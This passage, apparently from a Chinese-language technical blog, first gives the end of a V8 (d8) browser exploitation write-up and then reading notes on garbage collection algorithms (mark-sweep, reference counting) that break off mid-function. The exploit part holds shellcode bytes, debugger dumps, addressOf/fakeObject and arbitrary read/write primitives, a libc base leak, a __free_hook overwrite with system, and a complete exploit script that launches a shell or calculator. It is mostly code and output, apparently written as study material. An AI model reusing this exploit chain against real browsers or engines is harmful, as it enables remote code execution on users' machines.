0x53,0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x07, 0x00,0x00, 0x00, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f,0x05]for (let i = 0; i &lt; shellcode1.length; i++) &#123;    data_view.setUint8(i, shellcode1[i]);&#125;f();\n\nx86如下经过个人分析，x86的exp不可构造\nX86构造的过程中，发现在调用oob的过程中，当执行如下语句时\n// ××××××××2. addressOf和fakeObject的实现××××××××var obj = &#123;&quot;a&quot;: 1&#125;;var obj_array = [obj];var float_array = [1.1];var obj_array_map = obj_array.oob();var float_array_map = float_array.oob();\n\n泄露obj_array_map时发现泄露的是obj_array_map后面四个字节，内存如下\n;obj对象pwndbg&gt; job 0x294083a10x294083a1: [JSArray] - map: 0x4ccc17bd &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - prototype: 0x47b48a75 &lt;JSArray[0]&gt; - elements: 0x29408395 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS] - length: 1 - properties: 0x260c0695 &lt;FixedArray[0]&gt; &#123;    #length: 0x28dc00d5 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x29408395 &lt;FixedArray[1]&gt; &#123;           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt; &#125; ; obj参数对象pwndbg&gt; job 0x294083950x29408395: [FixedArray] - map: 0x260c045d &lt;Map&gt; - length: 1           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;pwndbg&gt; telescope 0x2940839400:0000│  0x29408394 —▸ 0x260c045d ◂— 0x260c00\t\t\t; obj_elements_map01:0004│  0x29408398 ◂— 0x2\t\t\t\t\t\t\t  ; length = 102:0008│  0x2940839c —▸ 0x29408321 ◂— 0x954ccc55\t\t; obj_elements_ptr03:000c│  0x294083a0 —▸ 0x4ccc17bd ◂— 0x4260c00\t\t\t; 要覆盖的map,也就是obj_map04:0010│  0x294083a4 —▸ 0x260c0695 ◂— 0x260c04\t\t\t; properties05:0014│  0x294083a8 —▸ 0x29408395 ◂— 0x2260c04\t\t\t; elements_obj06:0018│  0x294083ac ◂— 0x207:001c│  0x294083b0 —▸ 0x260c0b29 ◂— 0x260c00\n\n而泄露的内存为00000000260c0695，为obj_array_map的后四个字节，而我们通过调试知道，x86里面变量所占用的存储空间也为8个字节，也就是说，我oob函数读写的时候，所操作的内存空间是8个字节，而起始位置，为0x294083a4，也就正好是越过obj_map，也就是四个字节进行读写。所以我们没有办法操作obj_array_map。\n8、传统堆利用方式exp构造利用步骤步骤如下：\n1、泄露程序本身的地址空间\n2、计算d8基址，读取GOT表中malloc等libc函数的内存地址，然后然后计算free_hook或system或one_gadget的地址，最后将system或one_gadget写入free_hook触发hook调用即可实现命令执行\n3、调用free（实际上调用了/bin/sh），getshell\n泄露地址可以通过以下顺序：\n查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址\ndebug日志如下\npwndbg&gt; job 0x27b381f0f8c90x27b381f0f8c9: [JSArray] - map: 0x1ff245482ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x25166f051111 &lt;JSArray[0]&gt; - elements: 0x27b381f0f8b1 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 1 - properties: 0x0de30b5c0c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x2009df4801a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x27b381f0f8b1 &lt;FixedDoubleArray[1]&gt; &#123;           0: 1.1 &#125;pwndbg&gt; job 0x1ff245482ed90x1ff245482ed9: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x1ff245482e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype_validity cell: 0x2009df480609 &lt;Cell value= 1&gt; - instance descriptors #1: 0x25166f051f49 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - transitions #1: 0x25166f051eb9 &lt;TransitionArray[4]&gt;Transition array #1:     0x0de30b5c4ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x1ff245482f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; - prototype: 0x25166f051111 &lt;JSArray[0]&gt; - constructor: 0x25166f050ec1 &lt;JSFunction Array (sfi = 0x2009df486791)&gt; - dependent code: 0x0de30b5c02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0pwndbg&gt; job 0x25166f050ec10x25166f050ec1: [Function] in OldSpace - map: 0x1ff245482d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x25166f042109 &lt;JSFunction (sfi = 0x2009df483b29)&gt; - elements: 0x0de30b5c0c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - function prototype: 0x25166f051111 &lt;JSArray[0]&gt; - initial_map: 0x1ff245482d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; - shared_info: 0x2009df486791 &lt;SharedFunctionInfo Array&gt; - name: 0x0de30b5c3599 &lt;String[#5]: Array&gt; - builtin: ArrayConstructor - formal_parameter_count: 65535 - kind: NormalFunction - context: 0x25166f041869 &lt;NativeContext[246]&gt; - code: 0x1e6620dc6981 &lt;Code BUILTIN ArrayConstructor&gt; - properties: 0x25166f051029 &lt;PropertyArray[6]&gt; &#123;    #length: 0x2009df4804b9 &lt;AccessorInfo&gt; (const accessor descriptor)    #name: 0x2009df480449 &lt;AccessorInfo&gt; (const accessor descriptor)    #prototype: 0x2009df480529 &lt;AccessorInfo&gt; (const accessor descriptor)    0x0de30b5c4c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) properties[0]    0x0de30b5c4f41 &lt;Symbol: Symbol.species&gt;: 0x25166f050fd9 &lt;AccessorPair&gt; (const accessor descriptor)    #isArray: 0x25166f051069 &lt;JSFunction isArray (sfi = 0x2009df486829)&gt; (const data field 1) properties[1]    #from: 0x25166f0510a1 &lt;JSFunction from (sfi = 0x2009df486879)&gt; (const data field 2) properties[2]    #of: 0x25166f0510d9 &lt;JSFunction of (sfi = 0x2009df4868b1)&gt; (const data field 3) properties[3] &#125; - feedback vector: not availablepwndbg&gt; job 0x1e6620dc69810x1e6620dc6981: [Code] - map: 0x0de30b5c0a31 &lt;Map&gt;kind = BUILTINname = ArrayConstructorcompiler = turbofanaddress = 0x7ffc86ea2078Trampoline (size = 13)0x1e6620dc69c0     0  49ba8087519805560000 REX.W movq r10,0x560598518780  (ArrayConstructor)0x1e6620dc69ca     a  41ffe2         jmp r10Instructions (size = 28)0x560598518780     0  493955d8       REX.W cmpq [r13-0x28] (root (undefined_value)),rdx0x560598518784     4  7405           jz 0x56059851878b  (ArrayConstructor)0x560598518786     6  488bca         REX.W movq rcx,rdx0x560598518789     9  eb03           jmp 0x56059851878e  (ArrayConstructor)0x56059851878b     b  488bcf         REX.W movq rcx,rdi0x56059851878e     e  498b5dd8       REX.W movq rbx,[r13-0x28] (root (undefined_value))0x560598518792    12  488bd1         REX.W movq rdx,rcx0x560598518795    15  e926000000     jmp 0x5605985187c0  (ArrayConstructorImpl)0x56059851879a    1a  90             nop0x56059851879b    1b  90             nopSafepoints (size = 8)RelocInfo (size = 2)0x1e6620dc69c2  off heap targetpwndbg&gt; telescope 0x1e6620dc6980 2000:0000│   0x1e6620dc6980 —▸ 0xde30b5c0a31 ◂— 0xde30b5c0101:0008│   0x1e6620dc6988 —▸ 0xde30b5c2c01 ◂— 0xde30b5c0702:0010│   0x1e6620dc6990 —▸ 0xde30b5c0c71 ◂— 0xde30b5c0803:0018│   0x1e6620dc6998 —▸ 0xde30b5c2791 ◂— 0xde30b5c0704:0020│   0x1e6620dc69a0 —▸ 0x2009df4916a9 ◂— 0xd100000de30b5c1405:0028│   0x1e6620dc69a8 ◂— or     eax, 0xc6000000 /* &#x27;\\r&#x27; */06:0030│   0x1e6620dc69b0 ◂— sbb    al, 007:0038│   0x1e6620dc69b8 ◂— and    al, 0 /* &#x27;$&#x27; */08:0040│   0x1e6620dc69c0 ◂— movabs r10, 0x56059851878009:0048│   0x1e6620dc69c8 ◂— add    byte ptr [rax], al0a:0050│   0x1e6620dc69d0 ◂— add    byte ptr [rax], al... ↓0c:0060│   0x1e6620dc69e0 —▸ 0xde30b5c0a31 ◂— 0xde30b5c010d:0068│   0x1e6620dc69e8 —▸ 0xde30b5c2c01 ◂— 0xde30b5c070e:0070│   0x1e6620dc69f0 —▸ 0xde30b5c0c71 ◂— 0xde30b5c080f:0078│   0x1e6620dc69f8 —▸ 0xde30b5c2791 ◂— 0xde30b5c0710:0080│   0x1e6620dc6a00 —▸ 0x2009df4916c1 ◂— 0xd100000de30b5c1411:0088│   0x1e6620dc6a08 ◂— or     eax, 0xc6000000 /* &#x27;\\r&#x27; */12:0090│   0x1e6620dc6a10 ◂— mov    byte ptr [rcx], al13:0098│   0x1e6620dc6a18 ◂— lahf//在偏移0x40的位置取到程序地址空间地址pwndbg&gt; vmmap 0x560598518780LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x560597bc9000     0x5605987a1000 r-xp   bd8000 679000 /root/browser_study/v8/v8/v8/out/x64.release/d8 +0x94f780\n\n编写泄露地址空间地址代码如下\nvar a = [1.1, 2.2, 3.3];%DebugPrint(a);var code_addr = read64(addressOf(a.constructor) + 0x30n);var leak_d8_addr = read64(code_addr + 0x41n);console.log(&quot;[*] find libc leak_d8_addr: 0x&quot; + hex(leak_d8_addr));%SystemBreak();\n\ngdb执行如下\npwndbg&gt; rStarting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc1.js...0x2583cc70fa41 &lt;JSArray[3]&gt;[*] leak from: 0x000013eba5410ef0: 0x000015e8b1dc6981[*] leak from: 0x000015e8b1dc69c2: 0x00005626808ca780[*] find libc leak_d8_addr: 0x00005626808ca780pwndbg&gt; vmmap 0x00005626808ca780LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x56267ff7b000     0x562680b53000 r-xp   bd8000 679000 /root/browser_study/v8/v8/v8/out/x64.release/d8 +0x94f780\n\n计算程序基址以及got表各函数地址var d8_base_addr = leak_d8_addr -0xfc8780;var d8_got_libc_start_main_addr = d8_base_addr + 0x12a47b0;var libc_start_main_addr = read64(d8_got_libc_start_main_addr);var libc_base_addr = libc_start_main_addr - 0x26fc0n;var libc_system_addr = libc_base_addr + 0x55410;var libc_free_hook_addr = libc_base_addr + 0x1eeb28;console.log(&quot;[*] find libc libc_free_hook_addr: 0x&quot; + hex(libc_free_hook_addr)); %SystemBreak();write64(libc_free_hook_addr, libc_system_addr); console.log(&quot;[*] Write ok.&quot;);%SystemBreak();\n\n下面逐个进行讲解\n获取d8_base_addr通过下面两张图，可以看到我们泄露的地址为0x0000559f4ba96780，而应用程序的基地址为0x559f4aace000，这样他们的差值就为0xfc8780\n\n\n获取d8_got_libc_start_main_addrida查看.got的偏移，这里是0x12a47b0\n获取libc_start_main_addr\n\n获取libc_base_addrlibc的基址可以通过泄露的libc_start_main与偏移进行计算，我们在此次执行中可以知道0x00007f6e88df3fc0是libc_start_main在libc中的地址，0x7f6e88dcd000是libc基址，所以这里的偏移为0x26fc0\n获取libc_system_addr和libc_free_hook_addrida查看下libc文件，可以看出__libc_start_main确实是在libc基址偏移0x26fc0\n\n所以我们可以直接通过查看ida来确定system和free_hook的偏移，可以看出来分别为0x55410，0x1eeb28\n\n\n也可以通过gdb中泄露函数或者全局变量的地址，再通过与libc基址相减，即可得到相对应的偏移\n\n最后申请一个变量在进行释放，触发free操作\nfunction get_shell()&#123;    let get_shell_buffer = new ArrayBuffer(0x1000);    let get_shell_dataview = new DataView(get_shell_buffer);    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\\x00 &#125;get_shell();\n\n结果如下\n\n也可以发送弹出计算器的命令\nfunction get_shell()&#123;    let get_shell_buffer = new ArrayBuffer(0x1000);    let get_shell_dataview = new DataView(get_shell_buffer);    //get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\\x00     get_shell_dataview.setFloat64(0, i2f(0x69622fn), true); // /snap/bi \tget_shell_dataview.setFloat64(3, i2f(0x2d656d6f6e672f6en), true); // n/gnome- \tget_shell_dataview.setFloat64(11, i2f(0x74616c75636c6163n), true); // calculat \tget_shell_dataview.setFloat64(19, i2f(0x726fn), true); // or&#125;get_shell();\n\n\n完整exp如下// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××var buf =new ArrayBuffer(16);var float64 = new Float64Array(buf);var bigUint64 = new BigUint64Array(buf);// 浮点数转换为64位无符号整数function f2i(f)&#123;    float64[0] = f;    return bigUint64[0];&#125;// 64位无符号整数转为浮点数function i2f(i)&#123;    bigUint64[0] = i;    return float64[0];&#125;// 64位无符号整数转为16进制字节串function hex(i)&#123;    return i.toString(16).padStart(16, &quot;0&quot;);&#125;// ××××××××2. addressOf和fakeObject的实现××××××××var obj = &#123;&quot;a&quot;: 1&#125;;var obj_array = [obj];var float_array = [1.1];var obj_array_map = obj_array.oob();var float_array_map = float_array.oob();// 泄露某个object的地址function addressOf(obj_to_leak)&#123;    obj_array[0] = obj_to_leak;    obj_array.oob(float_array_map);    let obj_addr = f2i(obj_array[0]) - 1n;    obj_array.oob(obj_array_map); // 还原array类型，以便后续继续使用    return obj_addr;&#125;// 将某个addr强制转换为object对象function fakeObject(addr_to_fake)&#123;    float_array[0] = i2f(addr_to_fake + 1n);    float_array.oob(obj_array_map);    let faked_obj = float_array[0];    float_array.oob(float_array_map); // 还原array类型，以便后续继续使用    return faked_obj;&#125;var fake_array = [    float_array_map,    i2f(0n),    i2f(0x41414141n),    i2f(0x1000000000n),    1.1,    2.2,];var fake_array_addr = addressOf(fake_array);var fake_object_addr = fake_array_addr - 0x40n + 0x10n;var fake_object = fakeObject(fake_object_addr);function read64(addr)&#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);    let leak_data = f2i(fake_object[0]);    console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));    return leak_data;&#125;function write64(addr, data)&#123;    fake_array[2] = i2f(addr - 0x10n + 0x1n);    fake_object[0] = i2f(data);    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));&#125;var data_buf = new ArrayBuffer(8);var data_view = new DataView(data_buf);var buf_backing_store_addr = addressOf(data_buf) + 0x20n;function write64_dataview(addr, data)&#123;    write64(buf_backing_store_addr, addr);    data_view.setFloat64(0, i2f(data), true);   // %SystemBreak();    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));&#125;var a = [1.1, 2.2, 3.3];var code_addr = read64(addressOf(a.constructor) + 0x30n);var leak_d8_addr = read64(code_addr + 0x41n);console.log(&quot;[*] find libc leak_d8_addr: 0x&quot; + hex(leak_d8_addr));var d8_base_addr = leak_d8_addr -0xfc8780n;\t\t\t\t\t\t\t//本人的libc版本是libc-2.31.so，具体的偏移需要根据自己的libc版本来确定var d8_got_libc_start_main_addr = d8_base_addr + 0x12a47b0n;var libc_start_main_addr = read64(d8_got_libc_start_main_addr);var libc_base_addr = libc_start_main_addr - 0x26fc0n;var libc_system_addr = libc_base_addr + 0x55410n;var libc_free_hook_addr = libc_base_addr + 0x00000000001EEB28n;console.log(&quot;[*] find libc libc_free_hook_addr: 0x&quot; + hex(libc_free_hook_addr));//%SystemBreak();//write64(libc_free_hook_addr, libc_system_addr);write64_dataview(libc_free_hook_addr, libc_system_addr);console.log(&quot;[*] Write ok.&quot;);//%SystemBreak();function get_shell()&#123;    let get_shell_buffer = new ArrayBuffer(0x1000);    let get_shell_dataview = new DataView(get_shell_buffer);    //get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\\x00    get_shell_dataview.setFloat64(0, i2f(0x69622fn), true); // /snap/bi    get_shell_dataview.setFloat64(3, i2f(0x2d656d6f6e672f6en), true); // n/gnome-    get_shell_dataview.setFloat64(11, i2f(0x74616c75636c6163n), true); // calculat    get_shell_dataview.setFloat64(19, i2f(0x726fn), true); // or&#125;get_shell();\n\n\n\n参考链接https://www.freebuf.com/news/203721.html\n"},{"title":"垃圾回收算法与实现","url":"/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/","content":"垃圾回收的算法与实现前言这篇文章与其说是blog，不如说是reading notes。里面大部分内容都参考自《垃圾回收的算法与实现》。另一部分则是笔者对v8的官方blog和源码进行分析得出。作者的文字内容逻辑清晰，通俗易懂，笔者受益匪浅，相信每个人阅读此书都有种醍醐灌顶的感觉。笔者仅仅是将书中的内容理解并归纳，方便日后应用可以找到理论依据，也是将自己的学习历程记录下来。我会用尽量精炼且逻辑清晰的语言描述一些概念，而不是用长篇累牍的描述与书中相同的东西，那毫无意义，这样做的目的是为了自己在多年后看到这篇文章仍然可以快速回忆起里面的内容，也希望可以帮助大家快速的掌握GC相关的知识。\nhere we go！\n算法篇一些定义对象：对象是 GC 的基本单位；对象由头（header）和域（field）构成，头（header）描述了对象的特征并可能设有一些flag数据结构，而域（field）则表示对象的数据部分。\nmutator：相当于进程，在运行的过程中会对内存进行操作，可以产生或销毁对象，也是GC的目标。\n堆：GC的主要目标，对象的分配和GC都在这里进行。$heap_start +  HEAP_SIZE == $heap_end\n活动对象/非活动对象：能通过 mutator 引用的对象称为“活动对象”。不能通过mutator 引用的对象称为“非活动对象”。\nchunk：对象所占用的那块空间。\n根（root）：是指向对象的指针的“起点”部分。寄存器、调用栈、全局变量空间这些都是根，因为他们可以指向活动对象。\n【评价标准】吞吐量：处理同样大小的堆需要的时间，时间越小吞吐量越大。\n【评价标准】最大暂停时间：GC会使 mutator 暂停执行，所有次GC中时间消耗最久的即为最大暂停时间，该指标影响了人机交互体验。\n【评价标准】堆使用效率：可以解释为完成同样的任务占用的堆空间越多，堆使用效率越低。\n【评价标准】是否利用缓存优势：具有引用关系的对象在堆中如果相距比较近，则可以提高在缓存中读取到想利用的数据的概率，令 mutator 高速运行。这叫做利用了缓存优势。\n三大经典算法：分别指GC标记-清除算法（Mark Sweep GC），引用计数法（Reference Counting），GC复制算法（Copying GC）。其他众多GC算法都是从这三种算法衍生出来的。\nGC标记 -清除算法（Mark Sweep GC）定义GC 标记 - 清除算法由标记阶段和清除阶段构成。标记阶段会将所有活动对象都做上标记。而清除阶段会将没有标记的对象（即非活动对象）进行内存回收。（John McCarthy 1960年发布）\n实现// mark_sweep：标记-清除算法，分为标记阶段和清除阶段mark_sweep()&#123; mark_phase() sweep_phase()&#125;// mark_phase：标记阶段遍历根为活动对象打上标记。mark_phase()&#123; for(r : $roots) mark(*r)&#125;// mark：对未打上标记的活动对象打上标记，并递归处理子对象。搜索方式属于深搜。mark(obj)&#123; if(obj.mark == FALSE) obj.mark = TRUE for(child : children(obj)) mark(*child)&#125;// sweep_phase：清除阶段从堆首遍历到堆尾，将已标记对象置为未标记，将未标记对象释放并链接入空闲链表。// 标记阶段和清除阶段有一个较大的区别就是标记阶段是从根开始遍历活动对象，而清除阶段是遍历整个堆。所以清除阶段花费的时间要久一点。sweep_phase()&#123;\tsweeping = $heap_start \twhile(sweeping &lt; $heap_end) &#123;     if(sweeping.mark == TRUE)     \t sweeping.mark = FALSE     else &#123;         sweeping.field_0 = $free_list\t\t\t\t// \t我们知道对象有头和域，这里将对象域的第一部分（即field_0）设置为之前空闲链表的第一个元素。\t         $free_list = sweeping\t\t\t\t\t\t//\t此时该对象成为了空闲链表的第一个元素，由于该对象的field_0存放了下一块空闲空间，这样依次就可以把所有空闲的空间都串在一起。         sweeping += sweeping.size   &#125; &#125;&#125;// new_obj：遍历空闲链表，从中取出合适大小的chunk并返回，如果选中的chunk比较大则对其进行切割。new_obj(size)&#123; chunk = pickup_chunk(size, $free_list) if(chunk != NULL) return chunk else allocation_fail()&#125;// 上面的分配策略叫作 First - fit。发现大于等于size 的chunk时就会立即返回该chunk。// 第二种策略是遍历空闲链表，返回大于等于 size 的最小chunk，这种策略叫作 Best - fit。// 最后一种策略叫作 Worst - fit，即找出空闲链表中最大的chunk，将其分割成 mutator 申请的大小和分割后剩余的大小，目的是将分割后剩余的chunk最大化。但因为 Worst - fit 很容易生成大量小的chunk，所以不推荐。\n\n评估优点\n实现简单：算法简单，实现容易，与其他算法的组合也简单。\n\n缺点\n碎片化：空闲链表里面的chunk地址空间一般是不连续的，造成了比较多的内存碎片。这样当分配大对象时即使空闲空间的总大小&gt;=大对象的大小也无法给大对象分配空间。\n分配速度较慢：GC 标记 - 清除算法使用了空闲链表的数据结构，这样在分配时需要遍历空闲链表来进行chunk的分配。而GC复制算法和GC标记-压缩等搜索型算法则不需要，它们的空闲空间是连续成块的，需要时将其切割即可。\n与写时复制技术不兼容：Linux在Fork进程时有“读时共享，写时复制”的机制。而在GC标记-清除算法的标记阶段会对每个对象进行进行标记，这样相当于对头进行了数据的写入，造成了无谓的内存复制。\n\n实际上缺点1和2都是空闲链表这个数据结构的问题，缺点三则是标记flag设置的问题。\n优化措施多个空闲链表（multiple free-list）总体来说就是将之前的单个空闲链表变为多个空闲链表，每个空闲链表装固定大小的空闲chunk，解决的是分配速度较慢的问题。\n一般mutator 很少会申请非常大的chunk。为了应对这种极少出现的情况而大量制造空闲链表，我们给chunk大小设定一个上限，chunk如果大于等于这个大小就全部采用一个空闲链表处理。举个例子——如果设定chunk大小上限为 100 个字，那么准备用于 2个字、3 个字、……、100 个字，以及大于等于 101 个字的总共 100 个空闲链表就可以了。\n// new_obj：分配对象的阶段，根据要分配对象的大小从对应的空闲链表中去取。new_obj(size)&#123; index = size / (WORD_LENGTH / BYTE_LENGTH) if(index &lt;= 100) if($free_list[index] != NULL) chunk = $free_list[index] $free_list[index] = $free_list[index].next return chunk else chunk = pickup_chunk(size, $free_list[101]) if(chunk != NULL) return chunk allocation_fail()&#125;// sweep_phase 清除阶段，清除时依据清除对象的大小放入对应的空闲链表中。sweep_phase()&#123; for(i : 2..101) $free_list[i] = NULL sweeping = $heap_start while(sweeping &lt; $heap_end) if(sweeping.mark == TRUE) sweeping.mark = FALSE else index = size / (WORD_LENGTH / BYTE_LENGTH ) if(index &lt;= 100) sweeping.next = $free_list[index] $free_list[index] = sweeping else sweeping.next = $free_list[101] $free_list[101] = sweeping sweeping += sweeping.size&#125;\n\nBIBOP法（Big Bag Of Pages）将堆切成若干块，每块堆空间里面存放的对象大小相同。下图第一部分和第三部分存放的都是三个字大小的对象，而第二部分存放的都是两个字大小的对象。但是有个问题，它不能完全消除碎片化——比方说在第一部分就有空闲chunk，而第二部分还是有活动对象，这样就产生了碎片化，不过可以一定程度上缓解之前的无序状态。\n\n位图标记法（bitmap mark）经典的GC标记-清除算法通过在对象的头中设置flag位来实现标记状态的判定，上面也已经提到了这与写时复制技术不兼容，所以我们可以维护一个表格来管理所有对象的标记状态。这个表格就叫做 “位图表格” 。利用这个位图表格进行标记的行为称为 “位图标记”。\n【优点】与写时复制技术兼容：比较好理解，这种方式标记修改的只是位图表格，并没有修改对象。\n【优点】清除操作更高效：由于维护了位图表格，清除阶段取消标志位的过程直接通过遍历位图表格取消置位即可。\n【注意】当堆不同时，offest也不同，这时就需要不同的位图表格来服务每一个堆。\n// mark：标记阶段，没什么好说的，只是之前标记了对象头，现在标记在位图表格中了。// 如何通过位图表格元素索引找到对应对象呢？这里维护了bitmap_tbl[index]和offset的对应关系，这里的索引从低到高与堆地址空间从低到高是对应的。mark(obj)&#123; obj_num = (obj - $heap_start) / WORD_LENGTH index = obj_num / WORD_LENGTH offset = obj_num % WORD_LENGTH if(($bitmap_tbl[index] &amp; (1 &lt;&lt; offset)) == 0) $bitmap_tbl[index] |= (1 &lt;&lt; offset) for(child : children(obj)) mark(*child)&#125;// sweep_phase：清除阶段同样是遍历堆，但是这里在位图表格中判断对象未被标记时放进空闲链表，如果已被标记则不管。在最后遍历位图表格统一将所有元素都置为未标记 。sweep_phase()&#123; sweeping = $heap_start index = 0 offset = 0 while(sweeping &lt; $heap_end) if($bitmap_tbl[index] &amp; (1 &lt;&lt; offset) == 0) sweeping.next = $free_list $free_list = sweeping index += (offset + sweeping.size) / WORD_LENGTH offset = (offset + sweeping.size) % WORD_LENGTH sweeping += sweeping.size      for(i : 0..(HEAP_SIZE / WORD_LENGTH - 1)) $bitmap_tbl[i] = 0&#125;\n\n延迟清除法（Lazy Sweep）延迟清除法是缩减因清除操作而导致的 mutator 最大暂停时间的方法。在标记操作结束后，不进行清除操作，而是如其字面意思一样让它“延迟”，通过“延迟”来防止 mutator 长时间暂停。它没有空闲链表这个数据结构。\n// new_obj：这里先使用快速方式从堆的中间部分往下寻找空闲对象，如果找不到。执行完整的GC标记-清除算法，如果仍然找不到则代表堆中没有适合大小的空闲块（因为这里没有空闲链表的数据结构）。这样确保整个堆已经被完整的遍历一遍了。说白了第一次lazy_sweep是快速搜索，第二次lazy_sweep是全量搜索。new_obj(size)&#123; chunk = lazy_sweep(size)\t\t\t\t// 第一遍处理，从中间向后进行处理，快速处理。 if(chunk != NULL) return chunk mark_phase() chunk = lazy_sweep(size)\t\t\t\t// 第二遍处理是执行完标记再进行的处理，从堆起始位置开始处理，是完整处理。 if(chunk != NULL) return chunk allocation_fail()&#125;// lazy_sweep： 清除阶段从sweeping位置开始向堆尾遍历，找到合适大小的空闲chunk就返回作为新对象的chunk。找到的如果是活动对象则将其取消标记。lazy_sweep(size)&#123; while($sweeping &lt; $heap_end) \tif($sweeping.mark == TRUE)\t\t $sweeping.mark = FALSE \telse if($sweeping.size &gt;= size) \t\tchunk = $sweeping \t\t$sweeping += $sweeping.size \t\treturn chunk\t$sweeping += $sweeping.size      $sweeping = $heap_start return NULL&#125;\n\n这种情况下可以减少最大暂停时间，但不是绝对。\n如果某次标记阶段结束后的堆如下——当$sweeping在空闲对象周围时可以马上获得chunk，此时可以减少 mutator 的暂停时间。而一旦$sweeping在活动对象周围时则将长时间获取不到空闲chunk，之后第二次进行了完整的标记-清除的过程反而使 mutator 的暂停时间增加。\n最大暂停时间较长的问题可以通过增量式垃圾回收方式解决（三色标记法）。\n\n引用计数法（Reference Counting）定义引用计数法中引入了“计数器”的概念，也就是有多少程序引用了这个对象（被引用数）。（George E. Collins 1960年发布，Harold McBeth 1963解决了循环引用的问题）\n实现创建对象// new_obj：当新创建一个对象时，计数器由0增加到1。new_obj(size)&#123; obj = pickup_chunk(size, $free_list) if(obj == NULL) allocation_fail() else obj.ref_cnt = 1 return obj&#125;\n\n更新引用计数// update_ptr：两步操作，一是进行计数器的增减，二是更新指针指向的对象。这里需要注意的就是需要先加后减，原因是为了处理 *ptr 和 obj 是同一对象时的情况，当先减后加时，obj的引用计数可能变为0被释放了，此时再进行加就找不到对象了（因为已经被回收了）。update_ptr(ptr, obj)&#123; inc_ref_cnt(obj) dec_ref_cnt(*ptr) *ptr = obj&#125;// inc_ref_cnt：简单将计数器数值加一。inc_ref_cnt(obj)&#123; obj.ref_cnt++&#125;// dec_ref_cnt：首先将计数器数值减一，如果该对象计数器数值变为0，则递归调用dec_ref_cnt函数处理该对象的子对象。之后释放该对象。dec_ref_cnt(obj)&#123; obj.ref_cnt-- if(obj.ref_cnt == 0) for(child : children(obj)) dec_ref_cnt(*child) reclaim(obj)&#125;\n\n引用计数法有两个特点\n\n引用计数法的垃圾回收是实时的。\n可以说将内存管理和mutator同时运行。\n\n评估优点\n立即回收垃圾：垃圾可以实时的被回收掉，并将chunk链接到空闲链表中供对象申请\n最大暂停时间短：其他GC方式都有一个专门的GC阶段，而引用计数法的GC和mutator是同时运行的。\n没必要沿指针查找：这个是引用计数法的特点，不同于搜索型算法，引用计数法没有遍历内存的过程。\n\n缺点\n计数器值的增减处理繁重：大多数情况下指针会频繁地更新。特别是有根的指针，这是因为根可以通过 mutator 直接被引用。\n计数器需要占用很多位：用于引用计数的计数器最大必须能数完堆中所有对象的引用数。假如我们用的是 32 位机器，那么就有可能要让 2 的 32 次方个对象同时引用一个对象。使堆使用效率降低了。\n实现烦琐复杂：引用计数的算法本身很简单，但事实上需要在每一处修改指针的代码出都加上增减计数器的逻辑。因为修改指针会发生的非常频繁，所以重写过程中很容易出现遗漏。引发bug或安全漏洞。\n循环引用无法回收：当两个对象互相引用时，各对象的计数器的值均为1。但是这些对象组并没有被其他任何对象引用。因此想一并回收这两个对象都不行。\n\n虽然引用计数法有很多缺点，但是引用计数法只要稍加改良，就会变得非常具有实用性了。\n优化措施延迟引用计数法（Deferred Reference Counting）该方式解决的是计数器值的增减处理繁重的问题。根的引用变化频繁是导致计数器增减处理繁重的重要原因之一。因此可以让根引用的指针变化不反映在计数器上。但可能发生对象仍在活动，但却被错当成垃圾回收的情况。于是，我们可以在延迟引用计数法中使用 ZCT（Zero Count Table）。ZCT 是一个表，它会记录计数器值在 dec_ref_cnt函数的作用下变为 0 的对象。由于计数器值为 0 的对象不一定都是垃圾，所以暂时先将这些对象保留。当ZST表爆满之后对ZST表进行处理来回收真正的垃圾。\n\n// dec_ref_cnt：减计数器函数。当对象的计数器被减为0时将其放入ZST表中，如果ZST表爆满则调用scan_zct清理ZST表，让活动对象离开，回收垃圾。dec_ref_cnt(obj)&#123; 